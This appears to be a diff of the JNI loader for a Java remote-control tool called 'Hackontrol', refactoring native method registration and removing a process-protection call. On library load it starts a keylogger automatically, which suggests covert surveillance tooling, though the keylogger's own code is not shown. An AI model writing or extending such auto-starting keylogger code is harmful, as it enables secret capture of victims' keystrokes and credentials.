@@ -1,15 +1,5 @@
-#include <jni.h>
-#include <khopanjni.h>
-#include "power.h"
+#include "register_native.h"
 #include "keylogger.h"
-#include "protect.h"
-
-static JNINativeMethod HackontrolNativeMethods[] = {
-	{"sleep",     "()Ljava/lang/String;", (void*) &NativeLibrary_sleep},
-	{"hibernate", "()Ljava/lang/String;", (void*) &NativeLibrary_hibernate},
-	{"restart",   "()Ljava/lang/String;", (void*) &NativeLibrary_restart},
-	{"shutdown",  "()Ljava/lang/String;", (void*) &NativeLibrary_shutdown}
-};
 
 JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM* virtualMachine, void* reserved) {
 	JNIEnv* environment = NULL;
@@ -19,21 +9,7 @@ JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM* virtualMachine, void* reserved) {
 		return JNI_VERSION_21;
 	}
 
-	jclass nativeLibraryClass = (*environment)->FindClass(environment, "com/khopan/hackontrol/NativeLibrary");
-	
-	if(!nativeLibraryClass) {
-		KHStandardErrorW(environment, L"Class 'com.khopan.hackontrol.NativeLibrary' not found");
-		goto nativeBindingFail;
-	}
-
-	jint result = (*environment)->RegisterNatives(environment, nativeLibraryClass, HackontrolNativeMethods, sizeof(HackontrolNativeMethods) / sizeof(HackontrolNativeMethods[0]));
-
-	if(result < 0) {
-		KHStandardErrorW(environment, L"Failed to register native methods for class 'com.khopan.hackontrol.NativeLibrary'");
-	}
-
-nativeBindingFail:
-	startKeyLogger(environment, virtualMachine);
-	ProtectProcess();
+	RegisterHackontrolNative(environment);
+	KeyLoggerInitialize(environment, virtualMachine);
 	return JNI_VERSION_21;
 }
